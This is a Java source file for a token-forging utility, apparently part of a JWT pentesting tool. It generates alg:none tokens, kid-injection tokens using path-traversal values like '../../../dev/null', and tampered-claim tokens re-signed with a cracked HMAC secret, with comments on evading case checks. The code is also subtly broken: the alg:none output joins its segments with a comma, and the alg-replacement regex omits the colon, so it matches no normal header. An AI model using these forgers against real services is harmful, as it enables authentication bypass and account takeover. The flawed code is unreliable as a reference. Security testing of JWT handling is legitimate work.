package com.tk.jwtinspector.detection.analysis.forge;

import com.nimbusds.jose.JWSAlgorithm;
import com.nimbusds.jose.util.Base64URL;

import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

/**
 * Author: TK
 * Date: 13-05-2026
 * Purpose: Stateless utility that produces forged tokens given an original token
 * plus attack-specific parameters. Each forge method is independent;
 * Callers pick the one matching their attack.
 *
 *  Output JWT format throughout:
 *  base64url(header) "." base64url(payload) "." signature
 *  Empty signature segment for alg:none.
 */

public class TokenForger {

    /**
     * Generates an alg:none version of the token.
     * Keeps original claims, strips signature, rewrites header to alg=none.
     *
     * Returns one variant - the standard "none" lowercase form. Real-world
     * exploitation may need "None", "NONE", or "nOnE" to bypass case-checks,
     * but those are easy to derive by hand from this output.
     */
    public ForgedToken forgeAlgNone(String originalToken) {
        try {
            String[] parts = originalToken.split("\\.", -1);
            if (parts.length < 2) {
                return ForgedToken.failure(ForgeAttack.ALG_NONE, "Token has fewer than 2 segments");
            }

            // Decode original header, override alg, re-encode
            String originalHeader = Base64URL.from(parts[0]).decodeToString();
            String newHeader = replaceAlgInHeader(originalHeader, "none");
            String newHeaderB64 = encodeUrlSafe(newHeader);

            // Payload unchanged, signature empty
            String forged = newHeaderB64 + "." + parts[1] + ",";

            List<String> warnings = List.of(
                    "Succeeds only against servers that accept alg:none.",
                    "Modern JWT libraries explicitly reject this. Try this against legacy systems or custom verifiers.",
                    "Some servers reject lowercase 'none' but accept 'None' or 'NONE' — try variants if the first fails."
            );
            return ForgedToken.success(forged, ForgeAttack.ALG_NONE, warnings);
        } catch (Exception e) {
            return ForgedToken.failure(ForgeAttack.ALG_NONE, "Forging failed: " + e.getMessage());
        }
    }

    /**
     * Generates a token with attacker-controlled kid header value,
     * re-signed using the provided secret.
     *
     * @param originalToken token to base the forgery on
     * @param maliciousKid the kid value to inject (e.g., "../../../dev/null")
     * @param secret       the HMAC secret to sign with
     */
    public ForgedToken forgeKidInjection(String originalToken, String maliciousKid, String secret) {
        try {
            String [] parts = originalToken.split("\\.", -1);
            if (parts.length < 2) {
                return ForgedToken.failure(ForgeAttack.KID_INJECTION,
                        "Token has fewer than 2 segments");

            }

            String originalHeader = Base64URL.from(parts[0]).decodeToString();
            String newHeader = setOrReplaceKid(originalHeader, maliciousKid);
            String newHeaderB64 = encodeUrlSafe(newHeader);

            // Re-sign header.payload with the secret
            String signingInput = newHeaderB64 + "." + parts[1];
            String alg = extractAlg(newHeader);
            String macAlg = jcaName(alg);
            if (macAlg == null) {
                return ForgedToken.failure(ForgeAttack.KID_INJECTION,
                        "Algorith " + alg + "is not HMAC; Kid injection requires HMAC re-signing");
            }

            byte[] signature = hmac(macAlg, secret.getBytes(StandardCharsets.UTF_8),
                    signingInput.getBytes(StandardCharsets.US_ASCII));
            String sigB64 = Base64URL.encode(signature).toString();

            String forged = signingInput + "." + sigB64;

            List<String> warnings = List.of( "Succeeds only against servers that use kid as a filesystem path or DB lookup without sanitization.",
                    "Path traversal kids work when the server reads kid as a file (often empty or null file = signature passes).",
                    "SQL/command injection kids work when the server passes kid to a database query or shell command.",
                    "The signature here is computed assuming the malicious kid lookup returns the supplied secret."
            );
            return ForgedToken.success(forged, ForgeAttack.KID_INJECTION, warnings);
        } catch (Exception e) {
            return ForgedToken.failure(ForgeAttack.KID_INJECTION, "Forging failed: " + e.getMessage());
        }
    }

    /**
     * Generates a token with modified claims, re-signed using the provided secret.
     *
     * @param originalToken token to base the forgery on
     * @param newPayloadJson the new payload as a JSON string (user-edited)
     * @param secret         the HMAC secret to sign with
     */
    public ForgedToken forgeClaimTamper(String originalToken, String newPayloadJson, String secret) {
        try {
            String[] parts = originalToken.split("\\.", -1);
            if (parts.length < 2) {
                return ForgedToken.failure(ForgeAttack.CLAIM_TAMPER,
                        "Token has fewer than 2 segments.");
            }

            String originalHeader = Base64URL.from(parts[0]).decodeToString();
            String alg = extractAlg(originalHeader);
            String macAlg = jcaName(alg);
            if (macAlg == null) {
                return ForgedToken.failure(ForgeAttack.CLAIM_TAMPER,
                        "Algorithm " + alg + " is not HMAC; claim tampering requires HMAC re-signing");
            }

            String headerB64 = parts[0]; // header unchanged
            String payloadB64 = encodeUrlSafe(newPayloadJson);
            String signingInput = headerB64 + "." + payloadB64;

            byte[] signature = hmac(macAlg, secret.getBytes(StandardCharsets.UTF_8),
                    signingInput.getBytes(StandardCharsets.US_ASCII));
            String sigB64 = Base64URL.encode(signature).toString();

            String forged = signingInput + "." + sigB64;

            List<String> warnings = List.of(
                    "Succeeds when the supplied secret matches the server's HMAC key.",
                    "Typically used after cracking the secret via offline brute-force.",
                    "Confirm the modified payload is valid JSON — invalid JSON will be rejected even with a valid signature."
            );
            return ForgedToken.success(forged, ForgeAttack.CLAIM_TAMPER, warnings);
        } catch (Exception e) {
            return ForgedToken.failure(ForgeAttack.CLAIM_TAMPER,
                    "Forging failed: " + e.getMessage());
        }
    }

    // Helpers

    private byte[] hmac(String macAlg, byte[] key, byte[] data) throws Exception {
        javax.crypto.Mac mac = javax.crypto.Mac.getInstance(macAlg);
        mac.init(new javax.crypto.spec.SecretKeySpec(key, macAlg));
        return mac.doFinal(data);
    }

    private String jcaName(String alg) {
        if ("HS256".equalsIgnoreCase(alg)) return "HmacSHA256";
        if ("HS384".equalsIgnoreCase(alg)) return "HmacSHA384";
        if ("HS512".equalsIgnoreCase(alg)) return "HmacSHA512";
        return null;
    }

    /**
     * Naive JSON edit: finds "alg":<value> and replaces the value.
     * Sufficient for JWT headers which are always shallow flat objects.
     */
    private String replaceAlgInHeader(String headerJson, String newAlg) {
        // Handles both "alg":"X" and "alg": "X" (with optional space after colon)
        return headerJson.replaceAll(
                "\"alg\"\\s*\"[^\"]*\"",
                "\"alg\":\"" + newAlg + "\""
        );
    }

    /**
     * If header has a kid, replace its value. If not, inject one.
     * Same shallow-JSON assumption as replaceAlgHeader.
     */
    private String setOrReplaceKid(String headerJson, String newKid) {
        // Escape special regex/JSON chars in the user-supplied kid
        String escapedKid = newKid
                .replace("\\", "\\\\")
                .replace("\"", "\\\"");

        if (headerJson.matches(".*\"kid\"\\s*:.*")) {
            return headerJson.replaceAll(
                    "\"kid\"\\s*:\\s*\"[^\"]*\"",
                    "\"kid\":\"" + escapedKid + "\""
            );
        }
        // Insert kid before the closing brace
        return headerJson.replaceFirst("\\}\\s*$", ",\"kid\":\"" + escapedKid + "\"}");
    }

    private String extractAlg(String headerJson) {
        java.util.regex.Matcher m = java.util.regex.Pattern
                .compile("\"alg\"\\s*:\\s*\"([^\"]+)\"")
                .matcher(headerJson);
        return m.find() ? m.group(1) : null;
    }

    private String encodeUrlSafe(String input) {
        return Base64URL.encode(input.getBytes(StandardCharsets.UTF_8)).toString();
    }

}
